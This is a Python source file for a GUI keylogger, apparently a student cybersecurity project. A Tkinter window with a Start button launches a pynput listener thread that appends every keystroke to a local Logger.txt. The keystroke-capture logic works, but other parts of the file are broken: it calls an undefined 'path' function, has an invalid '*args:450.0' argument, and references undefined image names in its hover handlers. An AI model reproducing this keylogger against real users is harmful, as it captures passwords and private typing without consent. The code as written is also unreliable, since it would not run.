from pathlib import Path 
from tkinter import Tk, Canvas , Button, PhotoImage
from threading import Thread 
from pynput import keyboard

Output_Path= Path(__file__).parent
Assets_Path= Output_Path / path(r"/C:/CyberSecurity Project/Keylogger/Keylogger file")

#used for importing without full filepath
def path_asset(path:str)->Path:
    return Assets_Path / Path(path)

#Creating the window
window=Tk()
window.geometry("900x600")
window.configure(bg='#FFFFFF')
window.title("Key Logger")

#Definfing the attributes for the canvas
canvas= Canvas(
    window,
    bg='#FFFFFF',
    height=600,
    width=900,
    bd=1,
    highlightthickness=0,
    relief="ridge"
)
canvas.place(x=0,y=0)

#importing the image
imported_image=PhotoImage(file=path_asset("image1.png"))
imp_img=canvas.create_image(
    *args:450.0,
    300.0,
    image=imported_image
)

#importing Button Image
import_button=PhotoImage(file=path_asset("button.png"))
import_hover_button=PhotoImage(file=path_asset("hover_button.png"))

#Button
Start_Button=Button(
    image=import_button,
    borderwidth=0,
    highlightthickness=0,
    command=lambda: start_keylogging(),
    relief="flat"
)
#positioning Button
Start_Button.place(
    x=583.0,
    y=328.0,
    width=143.0,
    height=44.0
)

#Hover Functions
def button_hover_on(e):
    Start_Button.config(image=button_hover.jpg)

def button_hover_off(e):
    Start_Button.config(image=button.jpg)

Start_Button.bind('<Enter>',button_hover_on)
Start_Button.bind('<Leave>',button_hover_off)

#Key Logging Functionality using pynput
def on_press(key):
    try:
        with open("Logger.txt","a") as log_file:
            log_file.write(f"{key.char}\n")
    except AttributeError:
        with open("Logger.txt","a") as log_file:
            log_file.write(f"{key}\n")

#Combinging the key presses
def start_logging():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

#Keylogging using threading
def start_keylogging():
    print("key Logging Started")
    print("File Saved as Logger.txt in",Assets_Path)
    logging_thread= Thread(target=start_logging, daemon=True)
    logging_thread.start()

#Fixed Windowsize
window.resizable(False,False)
window.mainloop()